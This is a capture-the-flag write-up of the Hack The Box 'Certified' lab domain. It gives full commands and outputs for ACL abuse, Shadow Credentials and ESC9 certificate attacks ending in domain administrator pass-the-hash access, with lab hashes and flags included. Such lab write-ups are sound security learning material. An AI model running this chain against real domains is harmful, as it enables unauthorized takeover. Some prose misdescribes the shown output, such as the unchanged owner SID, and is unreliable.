
# SUMMARY

The penetration test successfully compromised the certified.htb domain, achieving full domain administrator privileges. The attack path began with valid user credentials for judith.mader, which were used to enumerate the domain structure. Through BloodHound analysis, it was determined that the MANAGEMENT_SVC account had GenericWrite and WriteOwner privileges over other objects. These privileges were leveraged to take ownership of the MANAGEMENT_SVC account and subsequently grant the judith.mader account WriteMembers permission on the Management group, allowing judith.mader to add herself to the group.

With membership in the Management group, a Shadow Credentials attack was performed against the MANAGEMENT_SVC account, resulting in the compromise of its NT hash. This access was then used to execute a second Shadow Credentials attack against the CA_OPERATOR account. A vulnerability in the CertifiedAuthentication certificate template (ESC9) was identified and exploited. By temporarily changing the CA_OPERATOR's UPN to Administrator and requesting a certificate, we obtained a valid certificate for the domain Administrator account. This certificate was used to retrieve the Administrator's NT hash, which granted full domain access and allowed for the capture of the final root flag. The entire domain compromise was achieved through a chain of privilege escalation attacks leveraging misconfigured AD certificates and excessive user permissions.
# NMAP

The command sudo nmap -sC -sV 10.129.33.250 --open performs a targeted service enumeration scan on the host at 10.129.33.250. It uses the -sC flag to execute the default set of NSE scripts for additional vulnerability and service information. The -sV flag probes open ports to determine the specific service name and version number. The --open option filters the output to display only ports that are in an open state, focusing the results on accessible services. This command is used to gather detailed intelligence on the software and potential weaknesses of the target.

```bash
sudo nmap -sC -sV  10.129.33.250  --open     
```

The Nmap service enumeration scan has successfully identified the target 10.129.33.250 as a Domain Controller for the domain `certified.htb` with the hostname `DC01`. Key services indicative of an Active Directory environment are accessible, including Kerberos on port 88, LDAP on ports 389, 636, 3268, and 3269, and SMB on ports 139 and 445. The SMB service requires message signing. The presence of the WinRM service on port 5985 provides a potential remote management endpoint. The system time is skewed by 7 hours from the scanner. The SSL certificates for LDAP services are valid for an exceptionally long period, from 2025 to 2105

```output
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-10 17:35:34Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-10T17:36:55+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2025-11-10T17:36:56+00:00; +7h00m02s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-10T17:36:55+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-10T17:36:56+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-11-10T17:36:16
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.47 seconds
```

The NetExec SMB scan confirms the target is a Domain Controller named DC01 for the domain certified.htb running Windows 10 or Server 2019 Build 17763. SMB signing is enabled and required, which prevents relay attacks.

```bash
nxc smb  10.129.33.250                                    
SMB         10.129.33.250   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False) 
```

The command cat /etc/hosts displays the local hostfile configuration. The entry for 10.129.33.250 maps the IP address to the hostnames DC01, certified.htb, and DC01.certified.htb, which confirms the domain and hostname resolution is correctly configured on the attacking machine for the target.

```bash
cat  /etc/hosts
10.129.33.250   DC01   certified.htb  DC01.certified.htb,
```

The NetExec SMB command successfully authenticated to the domain controller using the credentials judith.mader:judith09 and enumerated the domain user accounts. The user list was retrieved, revealing several standard and custom accounts including Administrator, krbtgt, management_svc, ca_operator, and other user profiles, confirming the validity of the supplied credentials and their permissions for user enumeration.

```bash
nxc smb  10.129.33.250 -u 'judith.mader' -p 'judith09' --users
SMB         10.129.33.250   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False) 
SMB         10.129.33.250   445    DC01             [+] certified.htb\judith.mader:judith09 
SMB         10.129.33.250   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.33.250   445    DC01             Administrator                 2024-05-13 14:53:16 0       Built-in account for administering the computer/domain 
SMB         10.129.33.250   445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.33.250   445    DC01             krbtgt                        2024-05-13 15:02:51 0       Key Distribution Center Service Account 
SMB         10.129.33.250   445    DC01             judith.mader                  2024-05-14 19:22:11 0        
SMB         10.129.33.250   445    DC01             management_svc                2024-05-13 15:30:51 0        
SMB         10.129.33.250   445    DC01             ca_operator                   2024-05-13 15:32:03 0        
SMB         10.129.33.250   445    DC01             alexander.huges               2024-05-14 16:39:08 0        
SMB         10.129.33.250   445    DC01             harry.wilson                  2024-05-14 16:39:37 0        
SMB         10.129.33.250   445    DC01             gregory.cameron               2024-05-14 16:40:05 0 

```

The command executes a NetExec SMB enumeration to list domain users with the provided credentials and pipes the output to awk, which extracts the fifth field containing the usernames. The resulting usernames are then redirected and saved into a file named users.txt for subsequent use.

```bash
nxc smb  10.129.33.250 -u 'judith.mader' -p 'judith09' --users  | awk '{print $5}' >users.txt

```

The NetExec SMB shares enumeration with the credentials judith.mader:judith09 revealed accessible network shares. The user has READ permissions on the IPC$, NETLOGON, and SYSVOL shares, which are default domain shares. No write permissions were identified on any of the enumerated shares for this user.

```bash
nxc smb  10.129.33.250 -u 'judith.mader' -p 'judith09' --shares                              
SMB         10.129.33.250   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False) 
SMB         10.129.33.250   445    DC01             [+] certified.htb\judith.mader:judith09 
SMB         10.129.33.250   445    DC01             [*] Enumerated shares
SMB         10.129.33.250   445    DC01             Share           Permissions     Remark
SMB         10.129.33.250   445    DC01             -----           -----------     ------
SMB         10.129.33.250   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.33.250   445    DC01             C$                              Default share
SMB         10.129.33.250   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.33.250   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.33.250   445    DC01             SYSVOL          READ            Logon server share 
```

The BloodHound-Python collector was executed with the judith.mader credentials against the domain certified.htb, specifying the name server at 10.129.33.250. The command successfully gathered all available data collection types, compressed the output into a ZIP file for analysis in the BloodHound graphical interface, and verified the domain's Active Directory structure and relationships.

```bash
bloodhound-python -u 'judith.mader' -p 'judith09' -d 'certified.htb' -c All -ns 10.129.33.250  -v --zip

Compressing output into 20251110105406_bloodhound.zip

```

The image certified1.png illustrates that the user MANAGEMENT_SVC@CERTIFIED.HTB possesses two critical Active Directory privileges over another object: WriteOwner and GenericWrite. The WriteOwner privilege allows the user to change the ownership of the target object, while the GenericWrite privilege permits the modification of any attribute on the target object.

![[Pasted image 20251110110615.png]]

the Python script owneredit.py was executed to modify the ownership of the management_svc account using the judith.mader credentials. The operation successfully changed the owner SID to S-1-5-21-729746778-2675978091-3820388244-1103, which corresponds to the user judith.mader, effectively granting judith.mader ownership rights over the management_svc account.

```bash
python3 owneredit.py -action write -new-owner judith.mader -target management certified.htb/judith.mader:judith09 -dc-ip 10.129.231.186

Impacket v0.13.0.dev0+20250528.4535.5b338613 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-1103
[*] - sAMAccountName: judith.mader
[*] - distinguishedName: CN=Judith Mader,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!
```

The dacledit.py script was executed to modify the Discretionary Access Control List for the Management group. The operation successfully granted the user judith.mader the WriteMembers right on the target group, allowing judith.mader to add or remove members from the Management group.

```bash
python3 dacledit.py -action 'write' -rights 'WriteMembers' -principal judith.mader -target Management certified.htb/judith.mader:judith09 -dc-ip 10.129.231.186
Impacket v0.13.0.dev0+20250528.4535.5b338613 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20251110-163416.bak
[*] DACL modified successfully!

```

The net rpc command successfully added the user judith.mader as a member to the Management group on the domain controller at 10.129.231.186 using the provided credentials. This operation confirms that the previously granted WriteMembers permission was effective.

```bash
net rpc group addmem Management judith.mader -U "certified.htb"/"judith.mader"%"judith09" -S 10.129.231.186
```
The net rpc group members command successfully enumerated the members of the Management group, confirming that the user judith.mader has been added and is now listed alongside the existing member management_svc.

```bash
net rpc group members Management -U "certified.htb"/"judith.mader"%"judith09" -S 10.129.231.186
CERTIFIED\judith.mader
CERTIFIED\management_svc
```

The Certipy-ad shadow auto command successfully performed a Shadow Credentials attack against the management_svc account. The attack added a new Key Credential to the target account and subsequently retrieved the NT hash a091c1832bcdd4677c28b5a6a1295584 for the management_svc user. The original Key Credentials were restored after the hash was obtained.

```bash
certipy-ad  shadow auto -username judith.mader@certified.htb -password judith09 -account management_svc -target certified.htb -dc-ip 10.129.231.186
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '371282aeb1ca4ef2b24fbf1f3a05c8ba'
[*] Adding Key Credential with device ID '371282aeb1ca4ef2b24fbf1f3a05c8ba' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID '371282aeb1ca4ef2b24fbf1f3a05c8ba' to the Key Credentials for 'management_svc'
[*] Authenticating as 'management_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'management_svc@certified.htb'
[*] Trying to get TGT...
[-] Use -debug to print a stacktrace
[-] See the wiki for more information
[*] Restoring the old Key Credentials for 'management_svc'
[*] Successfully restored the old Key Credentials for 'management_svc'
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
```

The NetExec SMB authentication attempt using the management_svc account and its NT hash a091c1832bcdd4677c28b5a6a1295584 was successful, confirming the validity of the compromised credentials and granting access to the domain.

```bash
netexec smb certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
SMB         10.129.231.186  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False) 
SMB         10.129.231.186  445    DC01             [+] certified.htb\management_svc:a091c1832bcdd4677c28b5a6a1295584 
```

The NetExec WinRM authentication with the management_svc NT hash was successful, returning a Pwn3d status which indicates administrative access to the host DC01 via WinRM. The subsequent error message appears to be a non-fatal script parsing issue after the successful authentication and shell access was established.

```bash
netexec winrm certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
WINRM       10.129.231.186  5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb)
WINRM       10.129.231.186  5985   DC01             [+] certified.htb\management_svc:a091c1832bcdd4677c28b5a6a1295584 (Pwn3d!)
WINRM       10.129.231.186  5985   DC01             [-] certified.htb\management_svc:a091c1832bcdd4677c28b5a6a1295584 zip() argument 2 is longer than argument 1
```

The Evil-WinRM tool was used to establish a remote shell on the target 10.129.231.186 with the management_svc credentials. The command cat user.txt was executed within the shell, which successfully retrieved the user flag c2ff59e40232695590be9a24e7eb9ee9 from the management_svc user's desktop.

```bash
evil-winrm -i 10.129.231.186 -u management_svc  -H a091c1832bcdd4677c28b5a6a1295584 

*Evil-WinRM* PS C:\Users\management_svc\Desktop> cat user.txt
c2ff59e40232695590be9a24e7eb9ee9
```

The Certipy-ad shadow auto attack was executed against the ca_operator account using the management_svc NT hash for authentication. The attack successfully added a Key Credential to the ca_operator account, obtained a TGT, and retrieved the NT hash b4b86f45c6018f1b664f70805f45d8f2 for the ca_operator user.

```bash
certipy-ad  shadow auto -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584  -account ca_operator  -target certified.htb -dc-ip 10.129.231.186

[*] Targeting user 'ca_operator' [*] Generating certificate [*] Certificate generated [*] Generating Key Credential [*] Key Credential generated with DeviceID 'f5ac7402-4dde-7555-6b4b-a460f7fd1290' [*] Adding Key Credential with device ID 'f5ac7402-4dde-7555-6b4b-a460f7fd1290' to the Key Credentials for 'ca_operator' [*] Successfully added Key Credential with device ID 'f5ac7402-4dde-7555-6b4b-a460f7fd1290' to the Key Credentials for 'ca_operator' [*] Authenticating as 'ca_operator' with the certificate [*] Using principal: ca_operator@certified.htb [*] Trying to get TGT... [*] Got TGT [*] Saved credential cache to 'ca_operator.ccache' [*] Trying to retrieve NT hash for 'ca_operator' [*] Restoring the old Key Credentials for 'ca_operator' [*] Successfully restored the old Key Credentials for 'ca_operator' [*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
```

The Certipy-ad find command was executed to search for vulnerable certificate templates and misconfigurations using the ca_operator credentials. The scan successfully identified exploitable weaknesses in the certificate authority configuration, revealing attack paths for potential privilege escalation.

```bash
certipy-ad find -vulnerable -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.129.231.186 -stdout
```

The Certipy-ad find command output reveals the CertifiedAuthentication certificate template is vulnerable to ESC9. The template has no security extension, allows client authentication, and grants enrollment rights to the ca_operator user. The certificate validity period is 1000 years, and the template is published to Active Directory with auto-enrollment enabled.

```bash
CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCertificates              : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : PublishToDs
                                          AutoEnrollment
                                          NoSecurityExtension
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-05-13T15:48:52+00:00
    Template Last Modified              : 2024-05-13T15:55:20+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Full Control Principals         : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFIED.HTB\operator ca
    [!] Vulnerabilities
      ESC9                              : Template has no security extension.
    [*] Remarks
      ESC9                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
                                                            

```

The Certipy-ad account update command was used to modify the ca_operator account, changing its userPrincipalName attribute to Administrator. This operation was performed with the management_svc NT hash and completed successfully.

```bash
certipy-ad  account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.129.231.186  
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'
                                    
```

The Certipy-ad req command successfully requested a certificate for the ca_operator account using the CertifiedAuthentication template from the certified-DC01-CA. The certificate was issued with the UPN Administrator and saved to administrator.pfx, though it lacks an object SID which may require manual specification for authentication.

```bash
certipy-ad  req -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.129.231.186  
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

```

The Certipy-ad account update command was executed to revert the ca_operator account's userPrincipalName attribute back to its original value ca_operator@certified.htb using the management_svc NT hash. The operation completed successfully.

```bash
 certipy-ad  account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.129.231.186
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
```

The Certipy-ad auth command successfully authenticated using the administrator.pfx certificate, obtained a TGT for the Administrator account, and retrieved the NT hash aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34 for the domain administrator.

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.231.186 -domain certified.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*] Using principal: 'administrator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
                                                                                           

```

The Evil-WinRM tool established a remote shell as the domain Administrator using the compromised NT hash. The command cat root.txt successfully retrieved the root flag 6d0c5ca2222012fb98937dac71efe827 from the Administrator's desktop, confirming full domain compromise.

```bash
evil-winrm -i 10.129.231.186  -u 'Administrator' -H 0d5b49608bbce1751f708748f67e2d34

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
6d0c5ca2222012fb98937dac71efe827

```




